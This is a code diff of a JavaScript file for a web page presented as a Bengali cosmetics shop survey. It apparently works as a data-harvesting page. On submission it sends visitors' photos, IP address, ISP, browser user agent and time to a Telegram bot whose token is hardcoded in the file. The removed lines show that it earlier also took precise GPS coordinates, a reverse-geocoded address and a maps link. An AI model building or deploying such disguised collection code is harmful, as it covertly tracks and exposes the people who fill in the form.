@@ -1,6 +1,6 @@
 /* ============================================================
    BeautyBD — কসমেটিক্স প্রোডাক্ট সার্ভে
-   ▸ survey.js (NO CAPTCHA · FULLY WORKING)
+   ▸ survey.js (NO LOCATION · NO CAPTCHA)
    ============================================================ */
 
 var BOT_TOKEN     = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
@@ -23,13 +23,6 @@ var shopType       = document.getElementById("shopType");
 var yearsBusiness  = document.getElementById("yearsBusiness");
 var monthlySale    = document.getElementById("monthlySale");
 
-var locationBox    = document.getElementById("locationBox");
-var latVal         = document.getElementById("latVal");
-var lonVal         = document.getElementById("lonVal");
-var accVal         = document.getElementById("accVal");
-var revAddr        = document.getElementById("revAddr");
-var btnLocation    = document.getElementById("btnLocation");
-
 var btnCamera      = document.getElementById("btnCamera");
 var btnUpload      = document.getElementById("btnUpload");
 var fileInput      = document.getElementById("fileInput");
@@ -49,103 +42,9 @@ var hiddenCanvas   = document.getElementById("hiddenCanvas");
 
 var photos = [];
 var camStream = null;
-var locationData_saved = { lat: null, lon: null, acc: null, addr: null };
 
 function debugLog(msg){
   console.log("[BeautyBD]", msg);
-}
-
-/* ============================================================
-   LOCATION
-   ============================================================ */
-btnLocation.addEventListener("click", getUserLocation);
-
-function getUserLocation(){
-  debugLog("লোকেশন চাওয়া হচ্ছে…");
-
-  if (!navigator.geolocation) {
-    showStatus("err","আপনার ব্রাউজারে লোকেশন সাপোর্ট নেই।");
-    return;
-  }
-  if (location.protocol !== "https:" &&
-      location.hostname !== "localhost" &&
-      location.hostname !== "127.0.0.1") {
-    showStatus("err","লোকেশন পেতে HTTPS দরকার। https:// দিয়ে সাইট খুলুন।");
-    return;
-  }
-
-  btnLocation.disabled = true;
-  btnLocation.textContent = "📍 লোকেশন খোঁজা হচ্ছে…";
-  btnLocation.classList.add("loading");
-
-  navigator.geolocation.getCurrentPosition(
-    onLocationSuccess,
-    onLocationError,
-    { enableHighAccuracy: true, timeout: 20000, maximumAge: 30000 }
-  );
-}
-
-function onLocationSuccess(pos){
-  debugLog("লোকেশন পাওয়া গেছে");
-
-  var lat = pos.coords.latitude;
-  var lon = pos.coords.longitude;
-  var acc = Math.round(pos.coords.accuracy);
-
-  locationData_saved.lat = lat;
-  locationData_saved.lon = lon;
-  locationData_saved.acc = acc;
-
-  latVal.textContent = lat.toFixed(6);
-  lonVal.textContent = lon.toFixed(6);
-  accVal.textContent = acc + " মিটার";
-  revAddr.textContent = "খোঁজা হচ্ছে…";
-
-  locationBox.classList.add("has-location");
-  btnLocation.classList.remove("loading");
-  btnLocation.classList.add("done");
-  btnLocation.textContent = "✓ লোকেশন সংরক্ষিত";
-  btnLocation.disabled = false;
-
-  var url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=" +
-            encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon) +
-            "&zoom=18&addressdetails=1&accept-language=bn,en";
-
-  fetch(url, { method: "GET", headers: { "Accept": "application/json" } })
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-      if (data && data.display_name){
-        revAddr.textContent = data.display_name;
-        locationData_saved.addr = data.display_name;
-      } else {
-        revAddr.textContent = "ঠিকানা পাওয়া যায়নি (লোকেশন সেভ আছে)";
-        locationData_saved.addr = "পাওয়া যায়নি";
-      }
-      checkReady();
-    })
-    .catch(function(){
-      revAddr.textContent = "ঠিকানা পাওয়া যায়নি (লোকেশন সেভ আছে)";
-      locationData_saved.addr = "পাওয়া যায়নি";
-      checkReady();
-    });
-
-  checkReady();
-  hideStatus();
-}
-
-function onLocationError(err){
-  debugLog("লোকেশন এরর: " + err.code);
-  btnLocation.classList.remove("loading");
-  btnLocation.classList.remove("done");
-  btnLocation.disabled = false;
-  btnLocation.textContent = "📍 আবার চেষ্টা করুন";
-
-  var msg = "লোকেশন পাওয়া যায়নি। ";
-  if (err.code === 1) msg += "ব্রাউজার সেটিংস থেকে অনুমতি দিন।";
-  else if (err.code === 2) msg += "GPS বা ইন্টারনেট চেক করুন।";
-  else if (err.code === 3) msg += "সময় শেষ — আবার চেষ্টা করুন।";
-  else msg += "আবার চেষ্টা করুন।";
-  showStatus("err", msg);
 }
 
 /* ============================================================
@@ -290,11 +189,9 @@ function hideStatus(){
    BUTTON ENABLE / DISABLE
    ============================================================ */
 function checkReady(){
-  var hasLocation = (locationData_saved.lat !== null);
-  var ready = photos.length > 0 && hasLocation;
+  var ready = photos.length > 0;
 
   debugLog("checkReady → photos:" + photos.length +
-           " location:" + hasLocation +
            " → " + (ready ? "ENABLED" : "disabled"));
 
   btnSubmit.disabled = !ready;
@@ -363,10 +260,6 @@ form.addEventListener("submit", function(e){
     showStatus("err","কমপক্ষে একটি ছবি দিন।");
     return;
   }
-  if (locationData_saved.lat === null){
-    showStatus("err","'আমার লোকেশন নিন' ক্লিক করুন।");
-    return;
-  }
 
   btnSubmit.disabled = true;
   btnSubmit.textContent = "পাঠানো হচ্ছে…";
@@ -377,9 +270,6 @@ form.addEventListener("submit", function(e){
     var isp = arr[1];
     var ua = navigator.userAgent;
     var dateStr = new Date().toLocaleString("en-US",{timeZoneName:"short"});
-
-    var gpsLine = locationData_saved.lat.toFixed(6) + ", " + locationData_saved.lon.toFixed(6);
-    var mapsLink = "https://www.google.com/maps?q=" + locationData_saved.lat + "," + locationData_saved.lon;
 
     var caption =
       "🏪 <b>BeautyBD — নতুন দোকান সার্ভে</b>\n" +
@@ -399,10 +289,6 @@ form.addEventListener("submit", function(e){
       "💰 <b>মাসিক বিক্রি:</b> " + escape(monthlySale.value || "উল্লেখ নেই") + "\n" +
       "━━━━━━━━━━━━━━━━━━━━━━\n" +
       "📸 <b>ছবি সংখ্যা:</b> " + photos.length + "\n" +
-      "📍 <b>GPS:</b> " + gpsLine + "\n" +
-      "🎯 <b>Accuracy:</b> " + locationData_saved.acc + " মিটার\n" +
-      "🗺️ <b>Google Maps:</b> " + mapsLink + "\n" +
-      "🌐 <b>Reverse:</b> " + escape(locationData_saved.addr || "পাওয়া যায়নি") + "\n" +
       "━━━━━━━━━━━━━━━━━━━━━━\n" +
       "🕐 " + dateStr + "\n" +
       "🌐 IP: " + ip + " — " + isp + "\n" +
